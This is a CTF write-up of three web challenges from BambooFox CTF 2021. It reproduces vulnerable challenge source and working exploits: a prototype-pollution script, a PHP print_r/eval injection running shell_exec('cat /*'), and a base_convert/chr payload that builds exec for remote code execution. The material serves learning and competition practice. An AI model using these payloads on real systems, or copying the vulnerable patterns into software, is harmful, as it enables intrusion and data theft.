---
title: BambooFox CTF 2021 writeup
catalog: true
date: 2021-01-24 22:27:27
tags: [Security]
categories:
  - Security
photos: /img/bamboofox-ctf-2021-writeup/cover-en.png
---

## Preface

Recently, my interest is playing CTF, and I only play web problems inside, for a simple reason, because I don't know anything about other fields... Currently, I am more interested in web things, so I solve problems as a leisure activity.

This article is a summary of the BambooFox CTF 2021, and I only solved three problems.

<!-- more -->

## Time to Draw

It is a website that draws pictures and synchronizes them in real-time, and the source code is attached:

```js
const express = require("express");
const cookieParser = require('cookie-parser')
var crypto = require('crypto');
const secret = require("./secret");

const app = express();
app.use(cookieParser(secret.FLAG));

let canvas = {
    ...Array(128).fill(null).map(() => new Array(128).fill("#FFFFFF"))
};

const hash = (token) => crypto.createHash('sha256').update(token).digest('hex');

app.get('/', (req, res) => {
    if (!req.signedCookies.user)
        res.cookie('user', { admin: false }, { signed: true });

    res.sendFile(__dirname + "/index.html");
});

app.get('/source', (_, res) => {
    res.sendFile(__filename);
});

app.get('/api/canvas', (_, res) => {
    res.json(canvas);
});

app.get('/api/draw', (req, res) => {
    let { x, y, color } = req.query;
    if (x && y && color) canvas[x][y] = color.toString();
    res.json(canvas);
});

app.get('/promote', (req, res) => {
    if (req.query.yo_i_want_to_be === 'admin')
        res.cookie('user', { admin: true }, { signed: true });
    res.send('Great, you are admin now. <a href="/">[Keep Drawing]</a>');
});

app.get('/flag', (req, res) => {
    let userData = { isGuest: true };
    if (req.signedCookies.user && req.signedCookies.user.admin === true) {
        userData.isGuest = false;
        userData.isAdmin = req.cookies.admin;
        userData.token = secret.ADMIN_TOKEN;
    }

    if (req.query.token && req.query.token.match(/[0-9a-f]{16}/) &&
        hash(`${req.connection.remoteAddress}${req.query.token}`) === userData.token)
        res.send(secret.FLAG);
    else
        res.send("NO");
});

app.listen(3000, "0.0.0.0");
```

Because I just solved a prototype pollution problem recently, I saw it at a glance: `if (x && y && color) canvas[x][y] = color.toString();` and the judgment of the last paragraph:

``` js
if (req.query.token && req.query.token.match(/[0-9a-f]{16}/) &&
    hash(`${req.connection.remoteAddress}${req.query.token}`) === userData.token)
    res.send(secret.FLAG);
else
    res.send("NO");
```

As long as the userData.token can be controlled through prototype pollution, just find the correct value.

The final solution looks like this:

``` js
var axios = require('axios')
var crypto = require('crypto')
var baseUrl = 'http://chall.ctf.bamboofox.tw:8787'
var myip = '1.1.1.1'

const hash = (token) => crypto.createHash('sha256').update(token).digest('hex');
const token = '5555555555555555'

const hashValue = hash(`${myip}${token}`)

async function run() {
  await axios.get(baseUrl + '/api/draw?x=__proto__&y=token&color=' + hashValue)
  const response = await axios.get(baseUrl + '/flag?token=' + token)
  console.log(response.data)
}

run()
```

Let x = `__proto__`, y = token, so it becomes: `canvas['__proto__']['token'] = xxx`, achieving prototype pollution.

## ヽ(#`Д´)ﾉ

The code given for this problem is very short:

``` php
 <?= 
 	highlight_file(__FILE__) &&
 	strlen($🐱=$_GET['ヽ(#`Д´)ﾉ'])<0x0A &&
 	!preg_match('/[a-z0-9`]/i',$🐱) &&
 	eval(print_r($🐱,1)); 
```

The restrictions seem very strict, and the length can only be up to 9, and there can be no English or numbers.

I have solved similar problems before, which require using xor or not to generate characters, and then using the feature of PHP to execute functions by the name of string functions to achieve RCE.

However, the length limit of this problem is 9, which is impossible no matter how you think about it, because even some basic characters have already exceeded it.

So thinking from another angle, I tried to use an array, and after trying it myself, I found that the array can indeed bypass it, and the first two judgments can be passed. The next question is how to make: `eval(print_r($🐱,1)` can be executed smoothly.

My initial idea here is to make the things printed by print_r become legal PHP code, so it can be executed successfully. So I first tried to run PHP with the format printed by print_r, and tried the following:

``` php
<?php
 $arr = array(
  [0] => 1
 );
 print_r($arr);
?>
```

After execution, it will output: PHP Fatal error: Illegal offset type in /Users/li.hu/Documents/playground/php-test/er.php on line 3

It seems that the index of the array cannot be an array, otherwise an error will occur. I thought that this route should not work, but then I thought: "Since it will cause an error, is it possible to execute the function I want to execute before the error occurs?" and tried the following code:

``` php
<?php
 $arr = array(
  [0] => system("ls")
 );
 print_r($arr);
?>
```

I found that the result was printed out! And the original fatal error became a warning: Warning: Illegal offset type in /Users/huli/Documents/security/ais/php-challenge/b.php on line 3

I still don't know why until now, but as long as the value part has a function call, it will be like this.

So as long as the things generated by print_r become a piece of legal code, any character can be inserted, and the second half can be commented out with `/*`, and the final solution looks like this:

``` php
abs(1)); echo shell_exec("cat /*"); /*
```

First use abs(1) to turn the fatal error into a warning, then execute the desired code, and finally use comments to skip the back, and successfully get the flag.

After the game, I looked at other people's solutions and found that the query string is so magical. I always thought that the query string could only pass arrays, like this: `?a[]=1&a[]=2`, but later I found out that there can be things inside `[]`, like this: `?a[test]=1`, in PHP, you can get:

``` php
Array
(
    [test] => 1
)
```

If it is like this, you can make the key `/*` and the value `*/]); echo 123;/*`, and combine them into:

``` php
<?php
 Array(
  [/*] => "*/]); echo 123;/*"
 );
?>
```

Then successfully compose a piece of legal PHP code.

The most valuable thing I learned from this question is that query strings can not only pass arrays but also objects (at least PHP and Express support it, I'm not sure about others).

## calc.exe online

This is a calculator program, and the code is as follows:

``` php
<?php
error_reporting(0);
isset($_GET['source']) && die(highlight_file(__FILE__));

function is_safe($query)
{
    $query = strtolower($query);
    preg_match_all("/([a-z_]+)/", $query, $words);
    $words = $words[0];
    $good = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh', 'ncr', 'npr', 'number_format'];
    $accept_chars = '_abcdefghijklmnopqrstuvwxyz0123456789.!^&|+-*/%()[],';
    $accept_chars = str_split($accept_chars);
    $bad = '';
    for ($i = 0; $i < count($words); $i++) {
        if (strlen($words[$i]) && array_search($words[$i], $good) === false) {
            $bad .= $words[$i] . " ";
        }
    }

    for ($i = 0; $i < strlen($query); $i++) {
        if (array_search($query[$i], $accept_chars) === false) {
            $bad .= $query[$i] . " ";
        }
    }
    return $bad;
}

function safe_eval($code)
{
    if (strlen($code) > 1024) return "Expression too long.";
    $code = strtolower($code);
    $bad = is_safe($code);
    $res = '';
    if (strlen(str_replace(' ', '', $bad)))
        $res = "I don't like this: " . $bad;
    else
        eval('$res=' . $code . ";");
    return $res;
}
?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.9.1/css/bulma.min.css">
    <script defer src="https://use.fontawesome.com/releases/v5.3.1/js/all.js"></script>
    <title>Calc.exe online</title>
</head>
<style>
</style>

<body>
    <section class="hero">
        <div class="container">
            <div class="hero-body">
                <h1 class="title">Calc.exe Online</h1>
            </div>
        </div>
    </section>
    <div class="container" style="margin-top: 3em; margin-bottom: 3em;">
        <div class="columns is-centered">
            <div class="column is-8-tablet is-8-desktop is-5-widescreen">
                <form>
                    <div class="field">
                        <div class="control">
                            <input class="input is-large" placeholder="1+1" type="text" name="expression" value="<?= $_GET['expression'] ?? '' ?>" />
                        </div>
                    </div>
                </form>
            </div>
        </div>
        <div class="columns is-centered">
            <?php if (isset($_GET['expression'])) : ?>
                <div class="card column is-8-tablet is-8-desktop is-5-widescreen">
                    <div class="card-content">
                        = <?= @safe_eval($_GET['expression']) ?>
                    </div>
                </div>
            <?php endif ?>
            <a href="/?source"></a>
        </div>
    </div>
</body>

</html>
```

In short, it filters the string, and consecutive English words must appear in the list of functions related to math.

In addition, there can be no illegal characters, such as `$`, otherwise it will fail.

Many people have solved this question, but I had no clue when I first saw it, and I thought it would be quite troublesome. After sleeping for a while and waking up, I looked at the list of functions again and saw `base_convert`, which is a conversion of number systems.

Recalling the article I wrote before, [How to write console.log(1) without alphanumeric characters?](https://blog.huli.tw/2020/12/01/write-conosle-log-1-without-alphanumeric/), it actually mentioned that any character can be generated by using number system conversion.

PHP can execute the code like this:

``` php
<?php
 ("system")("ls /");
?>
```

So as long as you can put together the two strings "system" and the command to be executed, this question can be solved.

But it should be noted that there will be spaces and "/" in the command, which cannot be converted by number system conversion. What should we do? You can first put together `chr`, and then use chr with ascii code to generate any character.

The final payload is as follows, combining `exec` and `chr` to form the command:

```
(base_convert(14, 10, 36).base_convert(33, 10, 36).base_convert(14, 10, 36).base_convert(12,10,36))(base_convert(12, 10, 36).base_convert(10, 10, 36).base_convert(29, 10, 36).(base_convert(12,10,36).base_convert(17,10,36).base_convert(27,10,36))(32).(base_convert(12,10,36).base_convert(17,10,36).base_convert(27,10,36))(47).(base_convert(12,10,36).base_convert(17,10,36).base_convert(27,10,36))(42))
```

By the way, I manually put it together, but I think I should write a program next time...

## Summary

I solved these three questions this time, and because it was for leisure, there was no pressure. If I had no idea after looking at the question, I would do something else and come back to continue solving it after a while.

It is regrettable that the other two web questions were not solved. One of them is to use special characters to bypass the check, which can be tried with tools like [domain-obfuscator](https://github.com/splitline/domain-obfuscator). This is also an interesting topic worth studying.

The other question is SQL injection combined with other techniques. I tried it a little bit when I was solving it, but didn't find anything, and I'm not so familiar with this topic, so I didn't continue.

In short, solving CTF questions is still quite interesting. Thanks to the organizers and question makers.
